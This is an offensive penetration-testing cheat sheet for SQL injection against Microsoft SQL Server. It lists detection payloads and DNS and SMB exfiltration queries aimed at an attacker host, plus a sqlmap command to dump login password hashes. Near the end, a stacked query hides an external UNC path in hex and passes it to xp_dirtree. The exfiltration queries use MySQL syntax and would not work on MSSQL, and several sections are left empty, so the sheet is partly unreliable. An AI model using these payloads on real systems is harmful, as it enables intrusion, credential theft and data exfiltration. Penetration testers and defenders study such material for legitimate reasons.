# Web Application - SQL Injection - MSSQL

Microsoft SQL Server is a relational database management system developed by
Microsoft.  
Microsoft markets a dozen different editions of Microsoft SQL Server with
various functionalities and aims. A list of the versions is available :
https://support.microsoft.com/en-us/help/321185/how-to-determine-the-version-edition-and-update-level-of-sql-server-an

**MSSQL supports stacked queries.**

### Vulnerable parameters detection

###### Injection locations

In a HTTP request there are a few possible injection points :
 - URL parameters
 - POST parameters
 - Cookie names and values
 - Host header and any custom headers

Note that while the entry points above are the most common, any content in an
HTTP request can be prone to SQL injection.

###### Injection detection

Detecting vulnerable parameters is most easily done by triggering errors and
boolean logic within the application.  
Supplying malformed queries will trigger errors and sending valid queries with
various boolean logic statements may trigger different responses from the web
server.  
Time based payload can also be used to detect SQL injection in MSSQL.  

| Technique      | Queries   |
|----------------|-----------|
| Error <br /> *A direct message can be returned or the page may act differently*    | `x='` <br/> `x=''` <br/> `x="` <br/> `x=""` <br/> `x=\` <br/> `x=\\` <br/> `x=\'` <br/> `...`  |
| Boolean Testing <br /> *Page can react differently if true or false* | `x=1 or 1=1 -- true` <br /> `x=1' or 1=1 -- true` <br/> `x=1" or 1=1 -- true` <br/> `x=1 or 1=2 -- false`  <br/> `...` |
| Time Based <br /> *A delay can be induced by the query execution* | `x=1 WAITFOR DELAY '0:0:5' -- Wait 5 seconds` <br /> `x=1; WAITFOR DELAY '0:0:5' -- Wait 5 seconds` <br />  `x=1 WAITFOR TIME '22:42' -- Wait until 22:42` <br /> `...` |

###### Automated detection

The detection of vulnerable parameters can be automated, using the `BurpSuite
Pro scanner` or `sqlmap` for example.

Note that second order SQL injection, which arises when user-supplied data is
first stored by the application and then later incorporated into SQL queries
in an unsafe manners, may not be properly detected by automatic tools.  

### Databases dumping

###### cheatsheet

| Description | Queries |
|-------------|---------|
| Comments | |
| Encoding queries | |
| Obfuscating queries | |
| Disable logging mechanisms | |
| MSSQL version | |
| Users and privileges | |
| Users' passwords | |
| Databases | |
| Tables | |
| Columns | |
| Data | |

### OS access

###### File system access

`MSSQL` provides multiples ways to read files  

###### Commands execution

The `xp_cmdshell` extended procedure can be used to execute system commands
given that the account making the queries has sufficient privileges on the SQL
service. While the procedure can be disabled, it could be reneabled depending
on the privileges of the account leveraged through the injection. Note that the
Windows process spawned by `xp_cmdshell` has the same security rights as the
SQL Server service account running the service.

As with any stored procedure, `xp_cmdshell` needs to be called through stacked
queries. For more information on how to execute commands through `xp_cmdshell`
and how to leverage the execution into a reverse shell, refer to the
`[L7] 1433 MSSQL` note.

### Out-of-band data exfiltration

| Description | Queries |
|-------------|---------|
| DNS request | `SELECT LOAD_FILE(concat('\\\\', (<SELECT_QUERY_ONE_ROW_RESULT>), '.<HOSTNAME>\\'))` |
| SMB request | `SELECT <...> INTO OUTFILE '\\<HOSTNAME>\<SMB_SHARE>\<OUTPUT_FILE>'` |
| HTTP requet | |


###### System account

###### Others

Get current user
1 AND 68 IN (SELECT (CAST(SYSTEM_USER AS NVARCHAR(4000))))

Get current db name
1 AND 3995 IN (SELECT (CAST(DB_NAME() AS NVARCHAR(4000))))

SQLMAP Get password hash
sqlmap -D master -T sys.sql_logins --dump

1;DECLARE @fktn VARCHAR(8000);SET @fktn=0x5c5c31302e31302e31342e3133305c666f6f616161;EXEC master..xp_dirtree @fktn--
